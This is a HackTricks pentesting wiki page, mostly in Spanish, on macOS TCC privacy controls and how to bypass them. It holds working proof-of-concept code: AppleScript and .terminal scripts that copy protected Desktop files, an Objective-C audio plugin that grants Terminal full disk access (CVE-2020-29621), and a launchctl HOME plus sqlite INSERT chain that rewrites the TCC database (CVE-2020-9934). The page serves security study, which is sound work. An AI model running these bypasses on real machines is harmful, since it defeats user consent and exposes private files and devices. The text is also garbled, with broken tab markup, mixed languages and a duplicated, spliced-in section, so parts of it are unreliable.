# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Información básica**

**TCC (Transparency, Consent, and Control)** es un mecanismo en macOS para **limitar y controlar el acceso de las aplicaciones a ciertas características**, generalmente desde una perspectiva de privacidad. Esto puede incluir cosas como servicios de ubicación, contactos, fotos, micrófono, cámara, accesibilidad, acceso completo al disco y mucho más.

Desde la perspectiva del usuario, ven TCC en acción **cuando una aplicación quiere acceder a una de las características protegidas por TCC**. Cuando esto sucede, el **usuario recibe una ventana emergente** preguntándole si desea permitir el acceso o no.

También es posible **conceder acceso a las aplicaciones** a archivos mediante **intenciones explícitas** de los usuarios, por ejemplo, cuando un usuario **arrastra y suelta un archivo en un programa** (obviamente, el programa debe tener acceso a él).

![Un ejemplo de una ventana emergente de TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** es manejado por el **daemon** ubicado en `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd` configurado en `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando el servicio mach `com.apple.tccd.system`).

Hay un **tccd de modo de usuario** ejecutándose por usuario registrado en `/System/Library/LaunchAgents/com.apple.tccd.plist` registrando los servicios mach `com.apple.tccd` y `com.apple.usernotifications.delegate.com.apple.tccd`.

Los permisos son **heredados del padre** de la aplicación y los **permisos** son **rastreados** en función del **ID de paquete** y del **ID de desarrollador**.

### Base de datos de TCC

Las selecciones se almacenan en la base de datos de TCC en todo el sistema en **`/Library/Application Support/com.apple.TCC/TCC.db`** o en **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferencias por usuario. La base de datos está **protegida contra la edición con SIP** (Protección de Integridad del Sistema), pero se pueden leer otorgando **acceso completo al disco**.

{% hint style="info" %}
La **interfaz de usuario del centro de notificaciones** puede hacer **cambios en la base de datos de TCC del sistema**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
Sin embargo, los usuarios pueden **eliminar o consultar reglas** con la utilidad de línea de comandos **`tccutil`**. 
{% endtab %}
{% tab title="kernel DB" %}
{% endtab %}
{% endtabs %}

{% hint style="info" %}
The TCC database is stored in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
{% endhint %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}

{% tab title="macOS TCC" %}
# Protecciones de seguridad de macOS: TCC

El Centro de control de transparencia (TCC) es un marco de seguridad de macOS que controla el acceso a ciertos servicios y datos del sistema. TCC se introdujo en OS X Mavericks (10.9) y se ha mejorado en cada versión posterior de macOS.

TCC se utiliza para controlar el acceso a los siguientes servicios y datos del sistema:

- Acceso a la cámara
- Acceso al micrófono
- Acceso a los contactos
- Acceso a los eventos del calendario
- Acceso a los recordatorios
- Acceso a los mensajes
- Acceso a los datos de ubicación
- Acceso a los datos de automatización de Apple

TCC se basa en una lista blanca de aplicaciones que tienen permiso para acceder a estos servicios y datos. Si una aplicación no está en la lista blanca, se le pedirá al usuario que otorgue permiso antes de que la aplicación pueda acceder a los servicios o datos.

TCC se almacena en la base de datos de seguridad del sistema, que se encuentra en `/Library/Application Support/com.apple.TCC/TCC.db`. La base de datos TCC contiene una tabla llamada `access`, que enumera las aplicaciones y los servicios a los que tienen acceso.

## Escalada de privilegios de TCC

La escalada de privilegios de TCC es un método para obtener acceso a los servicios y datos controlados por TCC sin el permiso del usuario. Esto se logra mediante la modificación de la base de datos TCC para agregar una entrada que permita el acceso a un servicio o dato específico.

La escalada de privilegios de TCC se puede lograr de varias maneras, incluyendo:

- Aprovechando una vulnerabilidad en una aplicación que ya tiene permiso para acceder a un servicio o dato controlado por TCC.
- Aprovechando una vulnerabilidad en una aplicación que no tiene permiso para acceder a un servicio o dato controlado por TCC y luego agregando manualmente una entrada a la base de datos TCC.
- Engañando al usuario para que otorgue permiso a una aplicación maliciosa para acceder a un servicio o dato controlado por TCC.

## Protección de TCC

Para protegerse contra la escalada de privilegios de TCC, se recomienda lo siguiente:

- Mantener el sistema operativo y las aplicaciones actualizadas con las últimas correcciones de seguridad.
- No otorgar permiso a aplicaciones desconocidas o sospechosas para acceder a servicios o datos controlados por TCC.
- No descargar aplicaciones de fuentes no confiables.
- Utilizar una solución de seguridad de confianza que pueda detectar y bloquear aplicaciones maliciosas que intenten acceder a servicios o datos controlados por TCC.
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Al verificar ambas bases de datos, puede verificar los permisos que una aplicación ha permitido, ha prohibido o no tiene (solicitará permiso).
{% endhint %}

* El **`auth_value`** puede tener diferentes valores: denegado(0), desconocido(1), permitido(2) o limitado(3).
* El **`auth_reason`** puede tomar los siguientes valores: Error(1), Consentimiento del usuario(2), Configuración del usuario(3), Configuración del sistema(4), Política de servicio(5), Política de MDM(6), Política de anulación(7), Cadena de uso faltante(8), Tiempo de espera de la solicitud(9), Preflight desconocido(10), Con derecho(11), Política de tipo de aplicación(12).
* Para obtener más información sobre los **otros campos** de la tabla, [**consulte esta publicación de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

{% hint style="info" %}
Algunos permisos de TCC son: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... No hay una lista pública que defina todos ellos, pero puede consultar esta [**lista de los conocidos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
{% endhint %}

También puede verificar los **permisos ya otorgados** a las aplicaciones en `Preferencias del sistema --> Seguridad y privacidad --> Privacidad --> Archivos y carpetas`.

### Verificación de firmas de TCC

La **base de datos** de TCC almacena el **ID de paquete** de la aplicación, pero también **almacena información** sobre la **firma** para **asegurarse** de que la aplicación que solicita usar un permiso sea la correcta.
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"

```
{% endcode %}

### Entitlements

Las aplicaciones no solo necesitan solicitar y obtener acceso a algunos recursos, sino que también necesitan tener los permisos relevantes. Por ejemplo, Telegram tiene el permiso `com.apple.security.device.camera` para solicitar acceso a la cámara. Una aplicación que no tenga este permiso no podrá acceder a la cámara (y ni siquiera se le pedirá permiso al usuario).

Sin embargo, para que las aplicaciones accedan a ciertas carpetas de usuario, como `~/Desktop`, `~/Downloads` y `~/Documents`, no necesitan tener permisos específicos. El sistema manejará el acceso de manera transparente y solicitará permiso al usuario según sea necesario.

Las aplicaciones de Apple no generarán solicitudes. Contienen derechos preconcedidos en su lista de permisos, lo que significa que nunca generarán una ventana emergente ni aparecerán en ninguna de las bases de datos de TCC. Por ejemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```
Esto evitará que Calendar solicite al usuario acceso a recordatorios, calendario y la libreta de direcciones.

### Lugares sensibles no protegidos

* $HOME (en sí mismo)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intención del usuario / com.apple.macl

Como se mencionó anteriormente, es posible **conceder acceso a una aplicación a un archivo arrastrándolo y soltándolo sobre ella**. Este acceso no se especificará en ninguna base de datos de TCC, sino como un **atributo extendido del archivo**. Este atributo **almacenará el UUID** de la aplicación permitida:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Es curioso que el atributo **`com.apple.macl`** sea gestionado por el **Sandbox**, no por tccd
{% endhint %}

El atributo extendido `com.apple.macl` **no se puede borrar** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como [**se explica en esta publicación**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible desactivarlo **comprimiendo** el archivo, **borrándolo** y **descomprimiéndolo**.

## Saltos

### Salto de escritura

Esto no es un salto, es simplemente cómo funciona TCC: **No protege de la escritura**. Si Terminal **no tiene acceso para leer el Escritorio de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop 
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
El **atributo extendido `com.apple.macl`** se agrega al nuevo **archivo** para dar acceso de lectura a la **aplicación creadora**.

### Bypass de SSH

Por defecto, un acceso a través de **SSH** tendrá **"Acceso completo al disco"**. Para desactivarlo, es necesario que esté en la lista pero desactivado (eliminarlo de la lista no eliminará esos privilegios):

![](<../../../../.gitbook/assets/image (569).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido evadir esta protección**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

### Bypass de Electron

El código JS de una aplicación Electron no está firmado, por lo que un atacante podría mover la aplicación a una ubicación escribible, inyectar código JS malicioso y lanzar esa aplicación y abusar de los permisos de TCC.

Electron está trabajando en la clave **`ElectronAsarIntegrity`** en Info.plist que contendrá un hash del archivo app.asar para verificar la integridad del código JS antes de ejecutarlo.

### Scripts de Terminal

Es bastante común dar **Acceso completo al disco (FDA)** a la terminal, al menos en las computadoras utilizadas por personas técnicas. Y es posible invocar scripts **`.terminal`** con él.

Los scripts **`.terminal`** son archivos plist como este con el comando a ejecutar en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y lanzarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
### kTCCServiceAppleEvents / Automatización

Una aplicación con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras aplicaciones**. Esto significa que podría ser capaz de **abusar de los permisos otorgados a otras aplicaciones**.

Para obtener más información sobre Apple Scripts, consulte:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Por ejemplo, si una aplicación tiene **permiso de automatización sobre `iTerm`**, como en este ejemplo **`Terminal`** tiene acceso sobre iTerm:

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y usarlo para realizar acciones:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Sobre Finder

O si una aplicación tiene acceso sobre Finder, podría ser un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
### Abuso de Proceso

Si logras **inyectar código en un proceso**, podrás abusar de los permisos de TCC de ese proceso. 

Consulta las técnicas de abuso de proceso en la siguiente página:

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

Mira algunos ejemplos en las siguientes secciones:

### CVE-2020-29621 - Coreaudiod

El binario **`/usr/sbin/coreaudiod`** tenía los permisos `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permite la inyección de código** y el segundo le da acceso para **administrar TCC**.

Este binario permitía cargar **plug-ins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos de TCC** con este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    
    add_tcc_entry();
    
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```
### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El demonio **tccd** de usuario utiliza la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) y debido a que el demonio TCC se ejecuta a través de `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.\
Por lo tanto, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio controlado**, **reiniciar** el demonio **TCC** y luego **modificar directamente la base de datos de TCC** para otorgarse a sí mismo **todos los permisos de TCC disponibles** sin nunca solicitar al usuario final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump                                                               
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761

Notas tenía acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se **crea en una ubicación no protegida**. Por lo tanto, se podría pedir a Notas que copie un archivo protegido en una nota (en una ubicación no protegida) y luego acceder al archivo:

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### CVE-2023-26818 - Telegram

Telegram tenía los permisos `com.apple.security.cs.allow-dyld-environment-variables` y `com.apple.security.cs.disable-library-validation`, por lo que era posible abusar de ellos para **obtener acceso a sus permisos**, como grabar con la cámara. Puedes [**encontrar el payload en el informe**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

## Referencias

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**https://www.youtube.com/watch?v=W9GxnP8c8FU**](https://www.youtube.com/watch?v=W9GxnP8c8FU)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
